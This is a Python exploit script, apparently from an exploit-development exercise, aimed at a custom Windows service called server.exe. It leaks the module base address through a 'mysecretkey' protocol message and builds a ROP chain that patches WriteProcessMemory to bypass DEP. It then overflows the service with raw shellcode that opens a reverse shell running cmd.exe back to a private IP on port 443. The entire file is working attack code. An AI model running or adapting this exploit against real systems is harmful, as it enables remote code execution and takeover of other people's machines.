import struct
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 12345
target = (TARGET_IP, TARGET_PORT) 

payload = struct.pack("<i", 0x6573796d) #esym
payload += struct.pack("<i", 0x74657263) #terc
payload += struct.pack("<i", 0x79656b) #yek
payload += struct.pack("<i",0x1)
payload += struct.pack("<i", 0x76726573) #vres
payload += struct.pack("<i", 0x652e7265) #e.re
payload += struct.pack("<i", 0x6578) #ex
payload += struct.pack("<i", 0x41414141) #padding
payload += struct.pack("<i", 0x4c304c) #LOL

with socket.create_connection(target) as sock:

    sent = sock.send(payload)
    print(f"sent {sent} bytes")
    resp = sock.recv(512)
    resp = str(resp).split("x")[1].replace("'","")

#print(resp)
base = hex(int("0x"+resp,16))
print(base)
server = int("0x"+resp,16)
#wpm = hex(int("0x"+resp,16) + 0xf238)
wpm = int("0x"+resp,16) + 0xf238

CRASH_LEN = 1900  # change me
offset = 1012
checksum_crash = int(hex(CRASH_LEN+20),16)

#\x00\x41
rop_nop = struct.pack("<I",server + 0x109d) #retn

#1st step - saving esp to eax&edx
rop = struct.pack("<I",server + 0x2805)   # PUSH ESP # XOR EAX,EAX # POP EBX # POP ESI # RETN    ** [server.exe] ** 
rop += struct.pack('<L',0x41414141) # padding for pop esi
rop += struct.pack("<I",server + 0x83f5) # MOV EAX,EBX # POP EBX # POP ESI # RETN    ** [server.exe] ** 
rop += struct.pack('<L',0x41414141) # padding for pop ebx
rop += struct.pack('<L',0x41414141) # padding for pop esi

#jumping over template
rop += struct.pack("<I",server + 0x90ec)  # ADD ESP,1C # RETN    ** [server.exe] **

rop += struct.pack('<L', wpm)    # Pointer to kernel32!WriteProcessMemory 
rop += struct.pack('<L', server + 0x9bfc)    # RX from MODULE no aslr (Protect: 00000020)
rop += struct.pack('<L', 0xFFFFFFFF)    # hProccess = handle to current process (Pseudo handle = 0xFFFFFFFF points to current process)
rop += struct.pack('<L', server + 0x9bfc)    # lpBaseAddress = RX from MODULE no aslr (Protect: 00000020)
rop += struct.pack('<L', 0x22222222)    # lpBuffer = base address of shellcode (dynamically generated)
rop += struct.pack('<L', 0x11111111)    # nSize = size of shellcode  - 0x300
rop += struct.pack('<L', server + 0x11008)    # lpNumberOfBytesWritten = RW in MODULE no aslr (Protect: 00000004) - DWORD  writable

#step 2 - patching wpm
rop += struct.pack('<L',server + 0x5ed1)  # ADD EAX,4 # POP EBX # RETN    ** [server.exe] *
rop += struct.pack('<L',0x41414141) # padding for pop ebx 
rop += struct.pack('<L',server + 0x5ed1)  # ADD EAX,4 # POP EBX # RETN    ** [server.exe] *
rop += struct.pack('<L',0x41414141) # padding for pop ebx 
rop += struct.pack('<L',server + 0x5ed1)  # ADD EAX,4 # POP EBX # RETN    ** [server.exe] *
rop += struct.pack('<L',0x41414141) # padding for pop ebx 
rop += struct.pack('<L',server + 0x5ed1)  # ADD EAX,4 # POP EBX # RETN    ** [server.exe] *
rop += struct.pack('<L',0x41414141) # padding for pop ebx 
rop += struct.pack('<L',server + 0x5ed1)  # ADD EAX,4 # POP EBX # RETN    ** [server.exe] *
rop += struct.pack('<L',0x41414141) # padding for pop ebx 
rop += struct.pack('<L',server + 0x17f1)  # MOV EBX,EAX # RETN    ** [server.exe] ** 
rop += struct.pack('<L',server + 0x90a5)  # MOV EAX,DWORD PTR [EAX] # RETN    ** [server.exe] **
rop += struct.pack('<L',server + 0x90a5)  # MOV EAX,DWORD PTR [EAX] # RETN    ** [server.exe] **
rop += struct.pack('<L',server + 0x17fa) # MOV DWORD PTR [EBX],EAX # RETN 

#step 3 - patching shellcodeaddress
rop += struct.pack('<L',server + 0x17ee)  # MOV EAX,EBX # RETN    ** [server.exe] ** 
rop += struct.pack('<L',server + 0x5ed1)  # ADD EAX,4 # POP EBX # RETN    ** [server.exe] *
rop += struct.pack('<L',0x41414141) # padding for pop ebx 
rop += struct.pack('<L',server + 0x5ed1)  # ADD EAX,4 # POP EBX # RETN    ** [server.exe] *
rop += struct.pack('<L',0x41414141) # padding for pop ebx 
rop += struct.pack('<L',server + 0x5ed1)  # ADD EAX,4 # POP EBX # RETN    ** [server.exe] *
rop += struct.pack('<L',0x41414141) # padding for pop ebx 
rop += struct.pack('<L',server + 0x5ed1)  # ADD EAX,4 # POP EBX # RETN    ** [server.exe] *
rop += struct.pack('<L',0xfffffddc) # padding for pop ebx  - 224
rop += struct.pack('<L',server + 0x17f4)  # MOV ECX,EAX # RETN  
rop += struct.pack('<L',server + 0x17fb)  # ADD EAX,EBX # XCHG EBX,EDX # CMP EBX,EAX # RETN 
rop += struct.pack('<L',server + 0x8ca8)  # MOV DWORD PTR [ECX],EAX # ADD ESP,34 # MOV EAX,1 # POP EBX # POP ESI # RETN 
rop += struct.pack('<L',0x41414141) # padding for pop ebx 
rop += struct.pack('<L',0x41414141) # padding for pop esi
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop

#returning UP since i have no space!
rop += struct.pack('<L',server + 0x3534)  # MOV EAX,ECX # RETN  
rop += struct.pack('<L',server + 0x3055)  # POP EBX # RETN    ** [server.exe] ** 
rop += struct.pack('<L',0xfffffbea) # -1046
rop += struct.pack('<L',server + 0x17fb)  # ADD EAX,EBX # XCHG EBX,EDX # CMP EBX,EAX # RETN 
rop += struct.pack('<L',server + 0x69ce)  # XCHG EAX,ESP # RETN    ** [server.exe] ** 

print(len(rop))
rop += b"D" * (700 - len(rop))


#step 4 - patching size
rop2 = struct.pack('<L',server + 0x3534)  # MOV EAX,ECX # RETN  
rop2 += struct.pack('<L',server + 0x5ed1)  # ADD EAX,4 # POP EBX # RETN    ** [server.exe] *
rop2 += struct.pack('<L',0x41414141) # padding for pop ebx 
rop2 += struct.pack('<L',server + 0x17f1)  # MOV EBX,EAX # RETN    ** [server.exe] ** 
rop2 += struct.pack('<L',server + 0x3567)  # POP EAX # POP ECX # RETN    ** [server.exe] ** 
rop2 += struct.pack('<L',0xfffffcfc) # - 300
rop2 += struct.pack('<L',0x41414141) # padding for pop ecx 
rop2 += struct.pack('<L',server + 0x14da)  # NEG EAX # RETN    ** [server.exe] **
rop2 += struct.pack('<L',server + 0x17fa) # MOV DWORD PTR [EBX],EAX # RETN 

#step 5 returning to esp
rop2 += struct.pack('<L',server + 0x17ee)  # MOV EAX,EBX # RETN    ** [server.exe] ** 
rop2 += struct.pack('<L',server + 0x3055)  # POP EBX # RETN    ** [server.exe] ** 
rop2 += struct.pack('<L',0xffffffec) # -20
rop2 += struct.pack('<L',server + 0x17fb)  # ADD EAX,EBX # XCHG EBX,EDX # CMP EBX,EAX # RETN 
rop2 += struct.pack('<L',server + 0x69ce)  # XCHG EAX,ESP # RETN    ** [server.exe] ** 

print(len(rop2))

#rop2 = b"A" * 56
shellcode = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x68\x72\xfe\xb3\x16\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55\x14\x89\xc3\x68\xcb\xed\xfc\x3b\xff\x55\x04\x89\x45\x1c\xba\x38\x07\x1c\x52\x81\xc2\xef\xee\xee\xff\xf7\xda\x52\xff\x55\x04\x89\x45\x20\x68\x0c\xba\x2d\xb3\xff\x55\x04\x89\x45\x24\x89\xe0\x66\xb9\x90\x05\x29\xc8\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\x1c\x31\xc0\x50\x50\x50\xb0\x06\x50\x2c\x05\x50\x40\x50\xff\x55\x20\x89\xc6\x31\xc0\x50\x50\x68\xc0\xa8\x72\x9a\x66\xb8\x01\xbb\xc1\xe0\x10\x66\x83\xc0\x02\x50\x54\x5f\x31\xc0\x50\x50\x50\x50\x04\x10\x50\x57\x56\xff\x55\x24\x56\x56\x56\x31\xc0\x50\x50\xb0\x80\x31\xc9\x66\xb9\x80\xff\x66\xf7\xd9\x01\xc8\x50\x31\xc0\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\xb0\x44\x50\x54\x5f\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e\x54\x5b\x89\xe0\x31\xc9\x66\xb9\x90\x03\x29\xc8\x50\x57\x31\xc0\x50\x50\x50\x40\x50\x48\x50\x50\x53\x50\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10"
shellcode += b"\x90" * (500-len(shellcode))

payload = struct.pack("<i", 0x6573796d) #esym
payload += struct.pack("<i", 0x74657263) #terc
payload += struct.pack("<i", 0x79656b) #yek
payload += struct.pack("<i",0x8)
payload += struct.pack("<i",checksum_crash)
payload += b"A" * 10
payload += rop2
payload += b"A" * (offset - 500 - len(rop2) - 10)
payload += shellcode
payload += rop_nop
payload += rop
payload += b"A" * (CRASH_LEN - len(rop) - offset  - 4)

with socket.create_connection(target) as sock:

    sent = sock.send(payload)
    print(f"sent {sent} bytes")
    
